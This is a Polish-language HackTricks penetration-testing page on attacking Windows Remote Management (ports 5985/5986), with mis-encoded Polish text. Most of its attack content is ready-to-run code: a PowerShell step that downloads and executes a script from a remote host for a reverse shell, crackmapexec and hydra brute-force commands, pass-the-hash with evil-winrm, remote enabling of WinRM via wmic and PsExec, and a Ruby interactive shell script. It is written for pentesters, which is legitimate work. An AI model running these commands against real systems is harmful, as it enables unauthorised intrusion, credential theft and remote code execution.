# 5985,5986 - Testowanie penetracyjne WinRM

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia z Hakerstwa**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci z Hakerstwa na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnoÅ›ciom i spostrzeÅ¼eniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) jest wyrÃ³Å¼niany jako **protokÃ³Å‚ firmy Microsoft**, ktÃ³ry umoÅ¼liwia **zdalne zarzÄ…dzanie systemami Windows** poprzez HTTP(S), wykorzystujÄ…c SOAP w procesie. Jest on zasadniczo zasilany przez WMI, prezentujÄ…c siÄ™ jako interfejs oparty na HTTP do operacji WMI.

ObecnoÅ›Ä‡ WinRM na maszynie umoÅ¼liwia Å‚atwe zdalne zarzÄ…dzanie za pomocÄ… PowerShell, podobnie jak dziaÅ‚a SSH dla innych systemÃ³w operacyjnych. Aby sprawdziÄ‡, czy WinRM jest aktywny, zaleca siÄ™ sprawdzenie otwarcia okreÅ›lonych portÃ³w:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Otwarty port z powyÅ¼szej listy oznacza, Å¼e WinRM zostaÅ‚ skonfigurowany, umoÅ¼liwiajÄ…c prÃ³by zainicjowania sesji zdalnej.

### **Inicjowanie sesji WinRM**

Aby skonfigurowaÄ‡ PowerShell dla WinRM, uÅ¼ywany jest polecenie `Enable-PSRemoting` firmy Microsoft, ktÃ³re ustawia komputer do akceptowania zdalnych poleceÅ„ PowerShell. PosiadajÄ…c podwyÅ¼szony dostÄ™p do PowerShell, moÅ¼na wykonaÄ‡ nastÄ™pujÄ…ce polecenia, aby wÅ‚Ä…czyÄ‡ tÄ™ funkcjonalnoÅ›Ä‡ i okreÅ›liÄ‡ dowolny host jako zaufany:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
To podejÅ›cie polega na dodaniu symbolu wieloznacznego do konfiguracji `trustedhosts`, krok ten wymaga ostroÅ¼nego rozwaÅ¼enia ze wzglÄ™du na jego implikacje. ZauwaÅ¼ono rÃ³wnieÅ¼, Å¼e konieczne moÅ¼e byÄ‡ zmienienie typu sieci z "Publiczna" na "Praca" na maszynie atakujÄ…cego.

Co wiÄ™cej, WinRM moÅ¼na **aktywowaÄ‡ zdalnie** za pomocÄ… polecenia `wmic`, co jest pokazane poniÅ¼ej:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ta metoda umoÅ¼liwia zdalnÄ… konfiguracjÄ™ WinRM, zwiÄ™kszajÄ…c elastycznoÅ›Ä‡ zarzÄ…dzania maszynami z systemem Windows z daleka.

### SprawdÅº, czy skonfigurowano

Aby zweryfikowaÄ‡ konfiguracjÄ™ maszyny atakujÄ…cej, uÅ¼ywane jest polecenie `Test-WSMan`, aby sprawdziÄ‡, czy docelowa maszyna ma poprawnie skonfigurowany WinRM. WykonujÄ…c to polecenie, powinieneÅ› otrzymaÄ‡ szczegÃ³Å‚y dotyczÄ…ce wersji protokoÅ‚u i wsmid, co wskazuje na poprawnÄ… konfiguracjÄ™. PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady przedstawiajÄ…ce oczekiwany wynik dla skonfigurowanego celu w porÃ³wnaniu z nieskonfigurowanym:

* Dla celu, ktÃ³ry **jest** poprawnie skonfigurowany, wynik bÄ™dzie wyglÄ…daÅ‚ podobnie do tego:
```bash
Test-WSMan <target-ip>
```
### Wykonaj polecenie

Aby zdalnie wykonaÄ‡ polecenie `ipconfig` na maszynie docelowej i wyÅ›wietliÄ‡ jego wynik, wykonaj:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (148).png>)

MoÅ¼esz rÃ³wnieÅ¼ **wykonaÄ‡ polecenie z bieÅ¼Ä…cej konsoli PS za pomocÄ…** _**Invoke-Command**_. ZaÅ‚Ã³Å¼my, Å¼e masz lokalnie funkcjÄ™ o nazwie _**enumeration**_ i chcesz jÄ… **wykonaÄ‡ na komputerze zdalnym**, moÅ¼esz to zrobiÄ‡:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Wykonaj skrypt
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Uzyskaj odwrotnÄ… powÅ‚okÄ™
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Uzyskaj sesjÄ™ PS

Aby uzyskaÄ‡ interaktywnÄ… powÅ‚okÄ™ PowerShell, uÅ¼yj `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1006).png>)

**Sesja zostanie uruchomiona w nowym procesie (wsmprovhost) wewnÄ…trz "ofiary"**

### **Wymuszanie otwarcia WinRM**

Aby korzystaÄ‡ z PS Remoting i WinRM, ale komputer nie jest skonfigurowany, moÅ¼esz go wÅ‚Ä…czyÄ‡ za pomocÄ…:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Zapisywanie i przywracanie sesji

To **nie zadziaÅ‚a**, jeÅ›li **jÄ™zyk** jest **ograniczony** na zdalnym komputerze.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
WewnÄ…trz tych sesji moÅ¼esz Å‚adowaÄ‡ skrypty PS za pomocÄ… _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### BÅ‚Ä™dy

JeÅ›li napotkasz nastÄ™pujÄ…cy bÅ‚Ä…d:

`enter-pssession : PoÅ‚Ä…czenie z serwerem zdalnym 10.10.10.175 nie powiodÅ‚o siÄ™ z nastÄ™pujÄ…cÄ… wiadomoÅ›ciÄ… o bÅ‚Ä™dzie : Klient WinRM nie moÅ¼e przetworzyÄ‡ Å¼Ä…dania. JeÅ›li schemat uwierzytelniania rÃ³Å¼ni siÄ™ od Kerberos, lub jeÅ›li komputer klienta nie jest doÅ‚Ä…czony do domeny, naleÅ¼y uÅ¼yÄ‡ transportu HTTPS lub dodaÄ‡ maszynÄ™ docelowÄ… do ustawienia konfiguracji TrustedHosts. UÅ¼yj winrm.cmd, aby skonfigurowaÄ‡ TrustedHosts. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e komputery na liÅ›cie TrustedHosts mogÄ… nie byÄ‡ uwierzytelnione. MoÅ¼esz uzyskaÄ‡ wiÄ™cej informacji, wykonujÄ…c nastÄ™pujÄ…ce polecenie: winrm help config. Aby uzyskaÄ‡ wiÄ™cej informacji, zobacz temat Pomoc dotyczÄ…cÄ… rozwiÄ…zywania problemÃ³w zdalnych.`

SprÃ³buj na kliencie (informacje z [tutaj](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami luk za pomocÄ… bug bounty!

**WglÄ…d w Hacking**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hackowania

**AktualnoÅ›ci na Å»ywo z Hackingu**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hackowania dziÄ™ki aktualnoÅ›ciom i wglÄ…dom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi bug bounty i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## PoÅ‚Ä…czenie z WinRM w systemie Linux

### Atak Brute Force

BÄ…dÅº ostroÅ¼ny, prÃ³ba siÅ‚owa na WinRM moÅ¼e zablokowaÄ‡ uÅ¼ytkownikÃ³w.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Korzystanie z evil-winrm
```ruby
gem install evil-winrm
```
Przeczytaj **dokumentacjÄ™** na jego githubie: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Aby uÅ¼yÄ‡ evil-winrm do poÅ‚Ä…czenia z adresem **IPv6**, utwÃ³rz wpis wewnÄ…trz _**/etc/hosts**_ ustawiajÄ…c **nazwÄ™ domeny** na adres IPv6 i poÅ‚Ä…cz siÄ™ z tÄ… domenÄ….

### Przekazanie hasha za pomocÄ… evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### Korzystanie z maszyny PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Korzystanie z skryptu w jÄ™zyku Ruby

**Kod wyodrÄ™bniony stÄ…d:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatyczne Komendy
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
â€‹

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami luk za nagrody!

**WglÄ…d w Hacking**\
Zanurz siÄ™ w treÅ›ciach, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania zwiÄ…zane z hakerstwem

**AktualnoÅ›ci z Hackingu na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim Å›wiatem hakerstwa dziÄ™ki aktualnoÅ›ciom i wglÄ…dom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami nagrÃ³d za znalezienie luk i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Nauka hakerstwa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
